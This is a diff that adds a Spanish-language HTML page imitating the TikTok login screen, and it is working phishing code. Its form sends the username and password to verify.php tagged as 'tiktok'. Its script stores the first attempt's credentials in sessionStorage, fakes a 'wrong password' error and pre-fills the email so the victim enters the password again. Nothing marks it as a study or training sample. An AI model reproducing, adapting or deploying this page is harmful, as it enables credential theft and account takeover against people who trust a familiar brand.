@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>TikTok - Iniciar sesión</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23000000' d='M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.04-.1z'/%3E%3C/svg%3E">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'PingFang SC', 'Microsoft YaHei', sans-serif;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .tk-header {
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(22, 24, 35, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .tk-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .tk-logo-icon {
+            width: 32px;
+            height: 32px;
+            background: #000;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .tk-logo-icon svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .tk-logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #161823;
+        }
+        
+        .tk-main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .tk-login-container {
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .tk-login-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .tk-login-header h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 8px;
+        }
+        
+        .tk-login-header p {
+            color: rgba(22, 24, 35, 0.75);
+            font-size: 15px;
+        }
+        
+        .error-box {
+            background: #fff4f4;
+            border: 1px solid #ff3b30;
+            border-radius: 8px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .error-box.show {
+            display: block;
+            animation: shake 0.5s;
+        }
+        
+        .error-title {
+            color: #ff3b30;
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .error-message {
+            color: #161823;
+            font-size: 13px;
+        }
+        
+        .error-message a {
+            color: #161823;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        .tk-input-group {
+            margin-bottom: 16px;
+        }
+        
+        .tk-input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #161823;
+            margin-bottom: 6px;
+        }
+        
+        .tk-input-wrapper {
+            position: relative;
+        }
+        
+        .tk-input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            background: rgba(22, 24, 35, 0.06);
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .tk-input:focus {
+            border-color: #161823;
+            background: #fff;
+        }
+        
+        .tk-input::placeholder {
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 14px;
+        }
+        
+        .tk-forgot {
+            text-align: right;
+            margin-bottom: 24px;
+        }
+        
+        .tk-forgot a {
+            color: rgba(22, 24, 35, 0.75);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .tk-forgot a:hover {
+            text-decoration: underline;
+        }
+        
+        .tk-login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 20px;
+        }
+        
+        .tk-login-btn:hover {
+            background: #e8254a;
+        }
+        
+        .tk-login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .tk-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 14px;
+        }
+        
+        .tk-divider::before,
+        .tk-divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: rgba(22, 24, 35, 0.12);
+        }
+        
+        .tk-divider span {
+            margin: 0 16px;
+        }
+        
+        .tk-social-login {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        
+        .tk-social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px;
+            background: white;
+            border: 1px solid rgba(22, 24, 35, 0.12);
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #161823;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .tk-social-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .tk-signup {
+            text-align: center;
+            font-size: 15px;
+            color: #161823;
+        }
+        
+        .tk-signup a {
+            color: #fe2c55;
+            font-weight: 700;
+            text-decoration: none;
+            margin-left: 4px;
+        }
+        
+        .tk-signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .tk-footer {
+            padding: 24px;
+            border-top: 1px solid rgba(22, 24, 35, 0.12);
+            text-align: center;
+        }
+        
+        .tk-footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 12px;
+        }
+        
+        .tk-footer-links a {
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 12px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .tk-footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .tk-copyright {
+            color: rgba(22, 24, 35, 0.5);
+            font-size: 12px;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .tk-header {
+                padding: 12px 16px;
+            }
+            
+            .tk-login-container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="tk-header">
+        <div class="tk-logo">
+            <div class="tk-logo-icon">
+                <!-- Icono TikTok SVG -->
+                <svg viewBox="0 0 24 24" fill="#00f2ea">
+                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.04-.1z"/>
+                </svg>
+                <svg viewBox="0 0 24 24" fill="#ff0050" style="position: absolute; right: -4px; bottom: -4px; width: 14px; height: 14px;">
+                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.04-.1z"/>
+                </svg>
+            </div>
+            <span class="tk-logo-text">TikTok</span>
+        </div>
+        <div></div>
+    </header>
+    
+    <main class="tk-main">
+        <div class="tk-login-container">
+            <div class="tk-login-header">
+                <h1>Iniciar sesión</h1>
+                <p>en TikTok</p>
+            </div>
+            
+            <div class="error-box" id="errorBox">
+                <div class="error-title">⚠️ Contraseña incorrecta</div>
+                <div class="error-message">
+                    La contraseña que has introducido no es correcta. 
+                    <a href="recovery.html">¿Olvidaste tu contraseña?</a>
+                </div>
+            </div>
+            
+            <form action="verify.php" method="POST" id="loginForm">
+                <input type="hidden" name="platform" value="tiktok">
+                <input type="hidden" name="attempt" id="attemptInput" value="1">
+                
+                <div class="tk-input-group">
+                    <label class="tk-input-label">Teléfono / nombre de usuario / correo electrónico</label>
+                    <div class="tk-input-wrapper">
+                        <input type="text" name="email" class="tk-input" id="emailInput" placeholder=" " required>
+                    </div>
+                </div>
+                
+                <div class="tk-input-group">
+                    <label class="tk-input-label">Contraseña</label>
+                    <div class="tk-input-wrapper">
+                        <input type="password" name="pass" class="tk-input" id="passInput" placeholder=" " required>
+                    </div>
+                </div>
+                
+                <div class="tk-forgot">
+                    <a href="recovery.html">¿Olvidaste la contraseña?</a>
+                </div>
+                
+                <button type="submit" class="tk-login-btn" id="loginBtn">Iniciar sesión</button>
+            </form>
+            
+            <div class="tk-divider">
+                <span>o</span>
+            </div>
+            
+            <div class="tk-social-login">
+                <a href="#" class="tk-social-btn">
+                    <!-- Icono Facebook -->
+                    <svg viewBox="0 0 20 20" fill="#1877f2">
+                        <path d="M10 0C4.477 0 0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.879v-6.99h-2.54V10h2.54V7.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-.443 2.89h-2.33v6.99C16.343 19.128 20 14.991 20 10c0-5.523-4.477-10-10-10z"/>
+                    </svg>
+                    Continuar con Facebook
+                </a>
+                <a href="#" class="tk-social-btn">
+                    <!-- Icono Google -->
+                    <svg viewBox="0 0 24 24">
+                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                    </svg>
+                    Continuar con Google
+                </a>
+            </div>
+            
+            <div class="tk-signup">
+                ¿No tienes una cuenta?
+                <a href="#">Regístrate</a>
+            </div>
+        </div>
+    </main>
+    
+    <footer class="tk-footer">
+        <div class="tk-footer-links">
+            <a href="#">Información</a>
+            <a href="#">Sala de prensa</a>
+            <a href="#">Empleo</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Ayuda</a>
+            <a href="#">Seguridad</a>
+            <a href="#">Comunidad</a>
+        </div>
+        <div class="tk-copyright">
+            © 2025 TikTok
+        </div>
+    </footer>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const showError = urlParams.get('error') === '1';
+        const savedEmail = urlParams.get('email');
+        
+        if (showError) {
+            document.getElementById('errorBox').classList.add('show');
+            if (savedEmail) {
+                document.getElementById('emailInput').value = decodeURIComponent(savedEmail);
+                document.getElementById('passInput').focus();
+            }
+            document.getElementById('attemptInput').value = '2';
+        }
+        
+        const storedEmail = sessionStorage.getItem('tk_email');
+        if (storedEmail && !savedEmail) {
+            document.getElementById('emailInput').value = storedEmail;
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('emailInput').value;
+            const pass = document.getElementById('passInput').value;
+            const attempt = document.getElementById('attemptInput').value;
+            
+            if (attempt === '1') {
+                e.preventDefault();
+                sessionStorage.setItem('tk_email', email);
+                sessionStorage.setItem('tk_pass', pass);
+                
+                const btn = document.getElementById('loginBtn');
+                btn.innerHTML = '<span class="loading-spinner"></span>Verificando...';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = `index.html?error=1&email=${encodeURIComponent(email)}`;
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
